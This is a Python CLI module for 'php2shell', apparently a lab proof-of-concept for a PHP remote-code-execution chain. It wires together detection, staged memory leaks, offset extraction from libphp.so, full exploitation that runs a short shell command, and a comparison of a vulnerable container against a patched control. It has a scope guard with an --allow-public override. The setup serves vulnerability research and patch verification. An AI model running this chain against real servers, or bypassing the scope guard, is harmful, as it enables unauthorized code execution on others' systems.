"""Command-line interface for the php2shell lab PoC."""

from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Optional, Sequence, Tuple

from . import __version__
from .config import ConfigError, ExploitConfig, LabConfig, TargetConfig
from .detect import (
    PATCHED,
    UNKNOWN,
    VULNERABLE,
    detect as detect_target,
    probe_verdict,
    version_text,
)
from .exploit import Exploit, ExploitResult
from .http import HttpClient
from .lab import (
    LabError,
    compose,
    container_health,
    container_image,
    container_state,
    docker_server_version,
    ensure_runtime,
    exec_in,
    php_ini,
    php_version,
    wait_healthy,
)
from .offsets import OffsetsError, from_container, offsets_from_env, write_env
from .profiles import (
    Profile,
    ProfileError,
    list_profiles,
    load_profile,
)
from .safety import ScopeError, assert_in_scope, describe_target


def int0(value: str) -> int:
    return int(value, 0)


def log_fn(quiet: bool) -> Callable[[str], None]:
    if quiet:
        return lambda _message: None
    return lambda message: print(message, flush=True)


def add_common(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-u", "--url", default=None, help="target URL (default: lab vuln)")
    parser.add_argument("--profile", default="bookworm", help="profile name or JSON path")
    parser.add_argument("--timeout", type=float, default=30.0, help="per-request timeout")
    parser.add_argument("--allow-public", action="store_true", help="override the scope guard")
    parser.add_argument("--allow-host", action="append", default=[], help="explicit host allowlist")
    parser.add_argument("-q", "--quiet", action="store_true", help="only errors and proofs")


def add_offsets(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--zif-offset", type=int0, default=None)
    parser.add_argument("--dtor-offset", type=int0, default=None)
    parser.add_argument("--htdata-offset", type=int0, default=None)
    parser.add_argument("--offsets-file", default=None)
    parser.add_argument("--container", default=None)
    parser.add_argument("--no-auto-offsets", action="store_true")


def add_exploit(parser: argparse.ArgumentParser) -> None:
    add_offsets(parser)
    parser.add_argument("-c", "--cmd", default=None, help="command, max 14 bytes")
    parser.add_argument("--proof-file", default=None, help="local proof path ('' disables)")
    parser.add_argument("--fetch", default="", help="GET this path after stage 3")
    parser.add_argument("--huge-mb", type=int, default=12)
    parser.add_argument("--retries", type=int, default=3)
    parser.add_argument("--no-pre-rotate", action="store_true")
    parser.add_argument("--no-retry-rotate", action="store_true")


def _lab() -> LabConfig:
    return LabConfig.from_env()


def _target(args: argparse.Namespace, lab: LabConfig) -> Tuple[TargetConfig, str]:
    url = args.url or lab.vuln_url
    target = TargetConfig(url, timeout=args.timeout, allow_public=args.allow_public)
    resolution = assert_in_scope(
        target.host, target.port, args.allow_public, args.allow_host
    )
    return target, resolution.primary


def _container_for(args: argparse.Namespace, lab: LabConfig, target: TargetConfig) -> str:
    if getattr(args, "container", None):
        return args.container
    if target.port == lab.patched_port:
        return lab.patched_container
    return lab.vuln_container


def _resolve_profile(
    args: argparse.Namespace,
    lab: LabConfig,
    target: TargetConfig,
    container: str,
    log: Callable[[str], None],
) -> Profile:
    profile = load_profile(args.profile)
    zif = getattr(args, "zif_offset", None)
    dtor = getattr(args, "dtor_offset", None)
    htdata = getattr(args, "htdata_offset", None)

    source = "profile JSON"
    local = target.host in ("127.0.0.1", "localhost", "::1")
    auto = not getattr(args, "no_auto_offsets", False)

    # Prefer the running container: a shared cache file may belong to the
    # other image (vuln vs patched) and have different offsets.
    if (zif is None or dtor is None) and auto and local:
        if container_state(container) == "running":
            info = from_container(container)
            zif = zif if zif is not None else info.zif_system
            dtor = dtor if dtor is not None else info.zval_ptr_dtor
            generated = lab.runtime_dir / "offsets-{}.env".format(container)
            write_env(generated, info)
            source = "{} ({}; sha256 {})".format(
                container, generated.name, info.sha256[:12]
            )

    offsets_path = (
        Path(args.offsets_file)
        if getattr(args, "offsets_file", None)
        else lab.runtime_dir / "offsets.env"
    )
    if (zif is None or dtor is None) and offsets_path.is_file():
        cached = offsets_from_env(offsets_path)
        if cached:
            zif = zif if zif is not None else cached.zif_system
            dtor = dtor if dtor is not None else cached.zval_ptr_dtor
            source = str(offsets_path)

    merged = profile.with_offsets(zif, dtor, htdata)
    log("[*] profile: {}".format(merged.summary()))
    log("[*] offsets source: {}".format(source))
    return merged


def _proof_default(
    args: argparse.Namespace, lab: LabConfig, target: TargetConfig
) -> Optional[Path]:
    value = getattr(args, "proof_file", None)
    if value == "":
        return None
    if value is not None:
        return Path(value)
    if target.host not in ("127.0.0.1", "localhost", "::1"):
        return None
    if target.port == lab.patched_port:
        return lab.patched_out / "p1"
    return lab.vuln_out / "p1"


def _exploit_config(
    args: argparse.Namespace,
    lab: LabConfig,
    target: TargetConfig,
    log: Callable[[str], None],
) -> ExploitConfig:
    proof = _proof_default(args, lab, target)
    if proof is None and not getattr(args, "fetch", ""):
        log("[!] no local proof path and no --fetch: success cannot be confirmed")
    config = ExploitConfig(
        cmd=getattr(args, "cmd", None) or "id>/out/p1",
        profile=args.profile,
        huge_mb=args.huge_mb,
        retries=args.retries,
        proof_file=proof,
        fetch=getattr(args, "fetch", ""),
        zif_offset=args.zif_offset,
        dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset,
        pre_rotate=not args.no_pre_rotate,
        retry_rotate=not args.no_retry_rotate,
        verbose=not args.quiet,
    )
    config.validate()
    return config


def _run_exploit(
    args: argparse.Namespace,
    lab: LabConfig,
    target: TargetConfig,
    ip: str,
    profile: Profile,
    log: Callable[[str], None],
    stop_after: str = "rce",
) -> ExploitResult:
    config = _exploit_config(args, lab, target, log)
    client = HttpClient(target, address=ip, log=log)
    exploit = Exploit(target, client, profile, config, log=log)
    return exploit.run(stop_after=stop_after)


def cmd_smoke(args: argparse.Namespace) -> int:
    lab = _lab()
    target, ip = _target(args, lab)
    log = log_fn(args.quiet)
    log("[*] target: {} ({})".format(target.url, describe_target(target.host, target.port)))
    client = HttpClient(target, address=ip, log=log)
    response = client.get(target.path)
    print("HTTP {}".format(response.status))
    preview = response.body[:200].decode("latin1", "replace")
    if preview:
        print(preview)
    return 0 if response.status == 200 else 1


def cmd_detect(args: argparse.Namespace) -> int:
    lab = _lab()
    quiet = args.quiet or args.json
    log = log_fn(quiet)
    target, ip = _target(args, lab)
    log("[*] target: {} ({})".format(target.url, describe_target(target.host, target.port)))
    client = HttpClient(target, address=ip, log=log)
    result = detect_target(client, target)

    if args.probe:
        ensure_runtime(lab)
        container = _container_for(args, lab, target)
        profile = _resolve_profile(args, lab, target, container, log)
        probe = _run_exploit(args, lab, target, ip, profile, log, stop_after="leak1")
        result.probe = {
            "success": probe.success,
            "stage1_cookie_len": probe.stage1_cookie_len,
            "chunk_base": "0x{:x}".format(probe.chunk_base) if probe.chunk_base else "",
            "error": probe.error,
        }
        result.verdict = probe_verdict(
            result.verdict, probe.success, probe.stage1_cookie_len
        )
        if probe.success:
            result.detail = "stage-1 leak reproduced ({} cookie bytes)".format(
                probe.stage1_cookie_len
            )
        elif not result.detail:
            result.detail = probe.error or "stage-1 leak not reproduced"

    if args.json:
        print(json.dumps(result.to_dict(), indent=2, sort_keys=True))
    else:
        print("target:    {}".format(result.url))
        print("HTTP:      {}".format(result.status_code))
        print("server:    {}".format(result.server or "-"))
        print("powered:   {}".format(result.powered_by or "-"))
        print("version:   {}".format(version_text(result.version)))
        print("verdict:   {}".format(result.verdict))
        if result.detail:
            print("detail:    {}".format(result.detail))
        if result.probe is not None:
            print("probe:     success={} cookie={}B chunk={}".format(
                result.probe["success"],
                result.probe["stage1_cookie_len"],
                result.probe["chunk_base"] or "-",
            ))

    if result.verdict == VULNERABLE:
        return 0
    if result.verdict == PATCHED:
        return 1
    if result.verdict == UNKNOWN:
        return 2
    return 2


def cmd_offsets(args: argparse.Namespace) -> int:
    lab = _lab()
    containers = (
        [lab.vuln_container, lab.patched_container]
        if args.all
        else [args.container or lab.vuln_container]
    )
    for container in containers:
        info = from_container(container, lib_path=args.lib_path)
        print("{}: zif=0x{:x} dtor=0x{:x} sha256={}".format(
            container, info.zif_system, info.zval_ptr_dtor, info.sha256
        ))
        if args.output:
            if args.all:
                output = lab.runtime_dir / "offsets-{}.env".format(container)
            else:
                output = Path(args.output)
            write_env(output, info)
            print("wrote {}".format(output))
    return 0


def cmd_leak(args: argparse.Namespace) -> int:
    lab = _lab()
    log = log_fn(args.quiet)
    ensure_runtime(lab)
    target, ip = _target(args, lab)
    container = _container_for(args, lab, target)
    log("[*] target: {} ({})".format(target.url, describe_target(target.host, target.port)))
    profile = _resolve_profile(args, lab, target, container, log)
    result = _run_exploit(
        args, lab, target, ip, profile, log,
        stop_after="leak1" if args.stage == 1 else "leak2",
    )
    print("STAGE1_COOKIE_BYTES={}".format(result.stage1_cookie_len))
    print("STAGE2_COOKIE_BYTES={}".format(result.stage2_cookie_len))
    if result.success:
        print("CHUNK_BASE=0x{:x}".format(result.chunk_base))
        print("HTDATA=0x{:x}".format(result.chunk_base + profile.htdata_offset))
        if args.stage == 2:
            print("LIBPHP_BASE=0x{:x}".format(result.libphp_base))
            print("ZIF=0x{:x}".format(result.libphp_base + profile.zif_offset))
        return 0
    print(result.error or "LEAK_FAILED", file=sys.stderr)
    return 1


def cmd_exploit(args: argparse.Namespace) -> int:
    lab = _lab()
    log = log_fn(args.quiet)
    ensure_runtime(lab)
    target, ip = _target(args, lab)
    container = _container_for(args, lab, target)
    log("[*] target: {} ({})".format(target.url, describe_target(target.host, target.port)))
    profile = _resolve_profile(args, lab, target, container, log)
    result = _run_exploit(args, lab, target, ip, profile, log)
    if result.success:
        print("PROOF: {}".format(result.proof))
        return 0
    print(result.error or "EXPLOIT_FAILED", file=sys.stderr)
    return 1


def _matrix_row(
    label: str,
    lab: LabConfig,
    args: argparse.Namespace,
    profile: Profile,
    url: str,
    container: str,
    out_dir: Path,
) -> Tuple[dict, ExploitResult]:
    target = TargetConfig(url, timeout=args.timeout)
    resolution = assert_in_scope(target.host, target.port)
    log = lambda message: print("[{}] {}".format(label, message), flush=True)
    log("[*] target {} ({})".format(target.url, describe_target(target.host, target.port)))
    with_offsets = _resolve_profile(args, lab, target, container, log)

    config = ExploitConfig(
        cmd=args.cmd or "id>/out/p1",
        profile=with_offsets.name,
        huge_mb=args.huge_mb,
        retries=args.retries,
        proof_file=out_dir / "p1",
        fetch="",
        pre_rotate=not args.no_pre_rotate,
        retry_rotate=not args.no_retry_rotate,
        verbose=True,
    )
    config.validate()
    client = HttpClient(target, address=resolution.primary, log=log)
    exploit = Exploit(target, client, with_offsets, config, log=log)
    result = exploit.run()

    row = {
        "label": label,
        "url": url,
        "container": container,
        "php_version": php_version(container),
        "profile": with_offsets.name,
        "profile_fingerprint": with_offsets.fingerprint(),
        "offsets": {
            "zif_system": "0x{:x}".format(with_offsets.zif_offset),
            "zval_ptr_dtor": "0x{:x}".format(with_offsets.dtor_offset),
            "htdata": "0x{:x}".format(with_offsets.htdata_offset),
        },
        "result": result.to_dict(),
    }
    return row, result


def cmd_matrix(args: argparse.Namespace) -> int:
    lab = _lab()
    ensure_runtime(lab)
    profile = load_profile(args.profile)
    missing = [
        name
        for name in (lab.vuln_container, lab.patched_container)
        if container_state(name) != "running"
    ]
    if missing:
        print("containers not running: {}; run 'make lab-up-patched'".format(", ".join(missing)),
              file=sys.stderr)
        return 1
    wait_healthy([lab.vuln_container, lab.patched_container])

    rows = []
    results = []
    for label, url, container, out_dir in (
        ("vuln", lab.vuln_url, lab.vuln_container, lab.vuln_out),
        ("patched", lab.patched_url, lab.patched_container, lab.patched_out),
    ):
        row, result = _matrix_row(label, lab, args, profile, url, container, out_dir)
        rows.append(row)
        results.append(result)
        if result.success:
            print("[+] {}: SUCCESS at {} after {} attempts ({:.1f}s)".format(
                label, result.stage, result.attempts, result.elapsed
            ))
            print("[+] {} proof: {}".format(label, result.proof))
        else:
            print("[-] {}: BLOCKED at {} after {} attempts ({:.1f}s): {}".format(
                label, result.stage or "stage0", result.attempts, result.elapsed,
                result.error or "no proof",
            ))

    vuln_ok = results[0].success
    patched_ok = results[1].success
    if vuln_ok and not patched_ok:
        verdict = "PATCHED_CONTROL_OK"
        code = 0
    elif vuln_ok and patched_ok:
        verdict = "UNEXPECTED_PATCHED_SUCCESS"
        code = 2
    else:
        verdict = "VULN_FAILED"
        code = 1

    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    payload = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "tool": "php2shell-poc {}".format(__version__),
        "verdict": verdict,
        "profile": profile.to_dict(),
        "profile_fingerprint": profile.fingerprint(),
        "lab": {
            "platform": lab.platform,
            "vuln_image": lab.vuln_image,
            "patched_image": lab.patched_image,
            "vuln_url": lab.vuln_url,
            "patched_url": lab.patched_url,
        },
        "results": rows,
    }
    lab.results_dir.mkdir(parents=True, exist_ok=True)
    output = lab.results_dir / "matrix-{}.json".format(stamp)
    output.write_text(json.dumps(payload, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    print("[=] verdict: {}".format(verdict))
    print("[=] results: {}".format(output.relative_to(lab.root)))
    return code


def cmd_doctor(args: argparse.Namespace) -> int:
    lab = _lab()
    failures = []
    print("php2shell {} doctor".format(__version__))
    print("root:    {}".format(lab.root))
    print("python:  {}".format(sys.version.split()[0]))
    if sys.version_info < (3, 9):
        failures.append("Python 3.9+ required")

    try:
        print("docker:  {}".format(docker_server_version()))
    except LabError as exc:
        print("docker:  ERROR ({})".format(exc))
        failures.append("docker daemon")
        print("profiles: {}".format(", ".join(list_profiles(lab.root)) or "none"))
        return 1

    try:
        compose(lab, ["config", "--quiet"])
        print("compose: valid")
    except LabError as exc:
        print("compose: ERROR ({})".format(exc))
        failures.append("compose config")

    for name in (lab.vuln_container, lab.patched_container):
        state = container_state(name)
        health = container_health(name)
        print("{}: state={} health={}".format(name, state, health))
        if state == "running":
            print("  image={} php={}".format(
                container_image(name), php_version(name)
            ))
            print("  memory_limit={} display_errors={} upload_progress={}".format(
                php_ini(name, "memory_limit"),
                php_ini(name, "display_errors"),
                php_ini(name, "session.upload_progress.enabled"),
            ))
            writable = exec_in(name, ["sh", "-c", "test -w /out && echo yes || echo no"])
            print("  /out writable: {}".format(writable.stdout.strip() or "unknown"))

    ensure_runtime(lab)
    size = lab.flag_file.stat().st_size if lab.flag_file.exists() else 0
    print("flag:    {} ({} bytes, synthetic, content redacted)".format(lab.flag_file, size))
    print("profiles: {}".format(", ".join(list_profiles(lab.root)) or "none"))
    for name in list_profiles(lab.root):
        print("  {} fingerprint={}".format(name, load_profile(name, lab.root).fingerprint()[:16]))

    if container_state(lab.vuln_container) == "running":
        try:
            target = TargetConfig(lab.vuln_url, timeout=5.0)
            assert_in_scope(target.host, target.port)
            response = HttpClient(target).get(target.path)
            print("vuln HTTP: {}".format(response.status))
            if response.status != 200:
                failures.append("vuln HTTP")
        except (OSError, ScopeError) as exc:
            print("vuln HTTP: ERROR ({})".format(exc))
            failures.append("vuln HTTP")

    if failures:
        print("doctor: FAIL ({})".format(", ".join(failures)))
        return 1
    print("doctor: OK")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="php2shell",
        description="PHP2Shell lab PoC (CVE-2026-109618 / CVE-2026-109619)",
    )
    parser.add_argument("--version", action="version", version="php2shell {}".format(__version__))
    subparsers = parser.add_subparsers(dest="command", required=True)

    doctor = subparsers.add_parser("doctor", help="check the local lab")
    doctor.set_defaults(func=cmd_doctor)

    smoke = subparsers.add_parser("smoke", help="GET the target page")
    add_common(smoke)
    smoke.set_defaults(func=cmd_smoke)

    detect = subparsers.add_parser(
        "detect", help="fingerprint PHP; optionally probe the stage-1 leak"
    )
    add_common(detect)
    add_offsets(detect)
    detect.add_argument("--probe", action="store_true", help="run the stage-1 leak probe")
    detect.add_argument("--huge-mb", type=int, default=12)
    detect.add_argument("--retries", type=int, default=3)
    detect.add_argument("--no-pre-rotate", action="store_true")
    detect.add_argument("--no-retry-rotate", action="store_true")
    detect.add_argument("--json", action="store_true")
    detect.set_defaults(func=cmd_detect)

    offsets = subparsers.add_parser("offsets", help="parse libphp.so symbols")
    offsets.add_argument("--container", default=None)
    offsets.add_argument("--all", action="store_true")
    offsets.add_argument("--output", default=None)
    offsets.add_argument("--lib-path", default="/usr/lib/apache2/modules/libphp.so")
    offsets.set_defaults(func=cmd_offsets)

    leak = subparsers.add_parser("leak", help="run stages 1 and 2 only")
    add_common(leak)
    add_offsets(leak)
    leak.add_argument("--huge-mb", type=int, default=12)
    leak.add_argument("--retries", type=int, default=3)
    leak.add_argument("--stage", type=int, choices=(1, 2), default=2)
    leak.add_argument("--no-pre-rotate", action="store_true")
    leak.add_argument("--no-retry-rotate", action="store_true")
    leak.set_defaults(func=cmd_leak)

    exploit = subparsers.add_parser("exploit", help="run the full chain")
    add_common(exploit)
    add_exploit(exploit)
    exploit.set_defaults(func=cmd_exploit)

    matrix = subparsers.add_parser("matrix", help="run vuln + patched control")
    add_common(matrix)
    add_offsets(matrix)
    matrix.add_argument("-c", "--cmd", default=None)
    matrix.add_argument("--huge-mb", type=int, default=12)
    matrix.add_argument("--retries", type=int, default=3)
    matrix.add_argument("--no-pre-rotate", action="store_true")
    matrix.add_argument("--no-retry-rotate", action="store_true")
    matrix.set_defaults(func=cmd_matrix)

    return parser


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except (ConfigError, ProfileError, ScopeError, OffsetsError, LabError) as exc:
        print("error: {}".format(exc), file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return 130
